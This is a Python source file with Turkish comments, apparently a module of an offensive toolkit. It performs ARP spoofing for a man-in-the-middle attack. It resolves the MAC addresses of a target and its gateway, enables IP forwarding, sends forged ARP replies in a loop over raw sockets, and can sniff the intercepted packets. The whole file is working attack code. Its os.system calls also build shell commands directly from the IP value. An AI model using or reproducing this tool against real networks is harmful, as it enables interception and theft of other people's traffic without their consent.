#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
noxious arp spoof modülü - arp zehirleme / mitm saldırısı

aynı ağdaki iki cihaz arasındaki trafiği araya girer.
hedef ve gateway'in arp tablosunu zehirleyerek trafiği
saldırganın makinesinden geçirir.

root yetkisi gerektirir.
"""

import socket
import struct
import os
import time
import signal
from typing import Optional

from cekirdek.gunluk import Gunluk
from cekirdek.ag_yardimcilar import (
    ip_gecerli_mi,
    mac_adresi_al,
    ag_arayuzleri_listele,
    arp_paketi_olustur,
)


def arp_spoof_baslat(
    hedef_ip: str,
    gateway_ip: str,
    arayuz: Optional[str] = None,
    paket_yakalama: bool = False,
    gunluk: Optional[Gunluk] = None,
) -> bool:
    """
    arp spoofing / mitm saldırısı başlatır

    hedef ve gateway'e sahte arp yanıtları göndererek
    her ikisinin de arp tablosunu zehirler.

    parametreler:
        hedef_ip: hedef cihazın ip adresi
        gateway_ip: ağ geçidinin (gateway) ip adresi
        arayuz: ağ arayüzü (none ise otomatik tespit)
        paket_yakalama: yakalanan paketleri göster
        gunluk: loglama nesnesi

    döndürür:
        başarılı ise true
    """
    if gunluk is None:
        gunluk = Gunluk()

    # parametre doğrulama
    if not ip_gecerli_mi(hedef_ip):
        gunluk.hata(f"geçersiz hedef ip: {hedef_ip}")
        return False

    if not ip_gecerli_mi(gateway_ip):
        gunluk.hata(f"geçersiz gateway ip: {gateway_ip}")
        return False

    # root kontrolü
    if not _root_mu():
        gunluk.hata("arp spoofing root yetkisi gerektirir (sudo ile çalıştırın)")
        return False

    # arayüz bilgilerini al
    if arayuz is None:
        arayuzler = ag_arayuzleri_listele()
        if not arayuzler:
            gunluk.hata("aktif ağ arayüzü bulunamadı")
            return False
        arayuz_bilgi = arayuzler[0]
        arayuz = arayuz_bilgi["arayuz"]
    else:
        arayuz_bilgi = {"arayuz": arayuz}

    saldirgan_mac = mac_adresi_al(arayuz)
    if not saldirgan_mac:
        gunluk.hata(f"mac adresi alınamadı: {arayuz}")
        return False

    # hedef mac adreslerini bul
    gunluk.baslik(f"arp spoofing — MITM saldırısı")
    gunluk.bilgi(f"hedef       : {hedef_ip}")
    gunluk.bilgi(f"gateway     : {gateway_ip}")
    gunluk.bilgi(f"arayüz      : {arayuz}")
    gunluk.bilgi(f"saldırgan mac: {saldirgan_mac}")
    gunluk.bos_satir()

    # hedef ve gateway mac adreslerini çöz
    gunluk.bilgi("mac adresleri çözümleniyor...")
    hedef_mac = _mac_cozumle(hedef_ip, arayuz)
    if not hedef_mac:
        gunluk.hata(f"hedef mac adresi çözümlenemedi: {hedef_ip}")
        return False

    gateway_mac = _mac_cozumle(gateway_ip, arayuz)
    if not gateway_mac:
        gunluk.hata(f"gateway mac adresi çözümlenemedi: {gateway_ip}")
        return False

    gunluk.basari(f"hedef mac   : {hedef_mac}")
    gunluk.basari(f"gateway mac : {gateway_mac}")
    gunluk.bos_satir()

    # ip forwarding aç
    gunluk.bilgi("ip forwarding açılıyor...")
    _ip_forwarding_ayarla(True)
    gunluk.basari("ip forwarding aktif")
    gunluk.bos_satir()

    # arp zehirleme başlat
    gunluk.uyari("arp zehirleme başlatılıyor... durdurmak için CTRL+C")
    gunluk.bos_satir()

    paket_sayisi = [0]

    # ctrl+c ile temiz çıkış
    def _sinyal_yakala(sig, frame):
        raise KeyboardInterrupt

    eski_sinyal = signal.signal(signal.SIGINT, _sinyal_yakala)

    try:
        soket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        soket.bind((arayuz, 0))

        while True:
            # hedefe: "ben gateway'im" de
            _sahte_arp_gonder(soket, hedef_ip, hedef_mac, gateway_ip, saldirgan_mac)
            # gateway'e: "ben hedefim" de
            _sahte_arp_gonder(soket, gateway_ip, gateway_mac, hedef_ip, saldirgan_mac)

            paket_sayisi[0] += 2

            if paket_sayisi[0] % 20 == 0:
                gunluk.bilgi(f"zehirleme devam ediyor... ({paket_sayisi[0]} paket gönderildi)")

            # paket yakalama
            if paket_yakalama:
                _basit_paket_dinle(arayuz, gunluk)

            time.sleep(1.0)

    except KeyboardInterrupt:
        gunluk.bos_satir()
        gunluk.uyari("durduruldu — arp tablosu geri yükleniyor...")

        # orijinal arp tablosunu geri yükle
        _arp_geri_yukle(hedef_ip, hedef_mac, gateway_ip, gateway_mac, arayuz, gunluk)

        # ip forwarding kapat
        _ip_forwarding_ayarla(False)
        gunluk.basari("ip forwarding kapatıldı")

        soket.close()

    except PermissionError:
        gunluk.hata("raw socket için root yetkisi gerekli")
        return False
    except OSError as hata:
        gunluk.hata(f"soket hatası: {hata}")
        return False
    finally:
        signal.signal(signal.SIGINT, eski_sinyal)

    gunluk.bos_satir()
    gunluk.basari(f"arp spoof tamamlandı — toplam {paket_sayisi[0]} paket gönderildi")
    return True


# ========================================
# dahi̇li̇ fonksi̇yonlar
# ========================================

def _sahte_arp_gonder(soket, hedef_ip, hedef_mac, sahte_ip, saldirgan_mac):
    """sahte arp reply gönderir"""
    hedef_mac_bayt = bytes.fromhex(hedef_mac.replace(":", ""))
    saldirgan_mac_bayt = bytes.fromhex(saldirgan_mac.replace(":", ""))

    # ethernet başlığı
    eth = struct.pack("!6s6sH", hedef_mac_bayt, saldirgan_mac_bayt, 0x0806)

    # arp reply (opcode = 2)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        0x0001,                              # hardware type
        0x0800,                              # protocol type
        6, 4,                                # hw/proto size
        0x0002,                              # opcode: reply
        saldirgan_mac_bayt,                  # sender mac (bizim mac)
        socket.inet_aton(sahte_ip),          # sender ip (sahte — gateway gibi davranıyoruz)
        hedef_mac_bayt,                      # target mac
        socket.inet_aton(hedef_ip),          # target ip
    )

    soket.send(eth + arp)


def _arp_geri_yukle(hedef_ip, hedef_mac, gateway_ip, gateway_mac, arayuz, gunluk):
    """orijinal arp tablosunu geri yükler"""
    try:
        soket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        soket.bind((arayuz, 0))

        # birkaç kez gönder (güvenilirlik için)
        for _ in range(5):
            # hedefe gerçek gateway mac'ini gönder
            _onarici_arp_gonder(soket, hedef_ip, hedef_mac, gateway_ip, gateway_mac)
            # gateway'e gerçek hedef mac'ini gönder
            _onarici_arp_gonder(soket, gateway_ip, gateway_mac, hedef_ip, hedef_mac)
            time.sleep(0.2)

        soket.close()
        gunluk.basari("arp tablosu geri yüklendi")

    except OSError as hata:
        gunluk.hata(f"arp geri yükleme hatası: {hata}")


def _onarici_arp_gonder(soket, hedef_ip, hedef_mac, gercek_ip, gercek_mac):
    """doğru arp bilgisini geri gönderir"""
    hedef_mac_bayt = bytes.fromhex(hedef_mac.replace(":", ""))
    gercek_mac_bayt = bytes.fromhex(gercek_mac.replace(":", ""))

    eth = struct.pack("!6s6sH", hedef_mac_bayt, gercek_mac_bayt, 0x0806)
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        0x0001, 0x0800, 6, 4, 0x0002,
        gercek_mac_bayt, socket.inet_aton(gercek_ip),
        hedef_mac_bayt, socket.inet_aton(hedef_ip),
    )
    soket.send(eth + arp)


def _mac_cozumle(hedef_ip, arayuz):
    """ip adresinden mac adresini çözer (arp request göndererek)"""
    try:
        # arp tablosundan kontrol et
        mac = _arp_tablosundan_bul(hedef_ip)
        if mac:
            return mac

        # arp isteği gönder
        arayuzler = ag_arayuzleri_listele()
        kaynak_ip = None
        kaynak_mac = None
        for a in arayuzler:
            if a["arayuz"] == arayuz:
                kaynak_ip = a["ip"]
                kaynak_mac = a.get("mac")
                break

        if not kaynak_ip or not kaynak_mac:
            return None

        soket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        soket.settimeout(2.0)
        soket.bind((arayuz, 0))

        paket = arp_paketi_olustur(hedef_ip, kaynak_ip, kaynak_mac)
        soket.send(paket)

        # yanıt bekle
        bitis = time.time() + 3.0
        while time.time() < bitis:
            try:
                yanit = soket.recv(65535)
                if len(yanit) >= 42:
                    opcode = struct.unpack("!H", yanit[20:22])[0]
                    if opcode == 2:
                        gonderici_ip = socket.inet_ntoa(yanit[28:32])
                        if gonderici_ip == hedef_ip:
                            mac = ":".join(f"{b:02x}" for b in yanit[22:28])
                            soket.close()
                            return mac
            except socket.timeout:
                break

        soket.close()

    except (PermissionError, OSError):
        pass

    # son çare: arp tablosundan tekrar dene (ping sonrası)
    try:
        os.system(f"ping -c 1 -W 1 {hedef_ip} > /dev/null 2>&1")
        return _arp_tablosundan_bul(hedef_ip)
    except Exception:
        pass

    return None


def _arp_tablosundan_bul(hedef_ip):
    """linux arp tablosundan mac adresi okur"""
    try:
        with open("/proc/net/arp", "r") as f:
            for satir in f:
                parcalar = satir.split()
                if len(parcalar) >= 4 and parcalar[0] == hedef_ip:
                    mac = parcalar[3]
                    if mac != "00:00:00:00:00:00":
                        return mac
    except (OSError, IOError):
        pass
    return None


def _ip_forwarding_ayarla(aktif: bool):
    """linux ip forwarding'i aç/kapat"""
    deger = "1" if aktif else "0"
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(deger)
    except (PermissionError, OSError):
        # sysctl alternatifi
        os.system(f"sysctl -w net.ipv4.ip_forward={deger} > /dev/null 2>&1")


def _basit_paket_dinle(arayuz, gunluk):
    """basit paket yakalama (raw socket)"""
    try:
        soket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
        soket.settimeout(0.1)
        soket.bind((arayuz, 0))

        try:
            veri, adres = soket.recvfrom(65535)
            if len(veri) > 34:
                # ip başlığını parse et
                ip_baslik = veri[14:34]
                kaynak = socket.inet_ntoa(ip_baslik[12:16])
                hedef = socket.inet_ntoa(ip_baslik[16:20])
                protokol = ip_baslik[9]

                proto_ad = {6: "TCP", 17: "UDP", 1: "ICMP"}.get(protokol, str(protokol))
                gunluk.ayiklama(f"  paket: {kaynak} → {hedef} [{proto_ad}] ({len(veri)} byte)")
        except socket.timeout:
            pass

        soket.close()
    except (PermissionError, OSError):
        pass


def _root_mu() -> bool:
    """root yetkisi var mı kontrol eder"""
    return hasattr(os, "geteuid") and os.geteuid() == 0
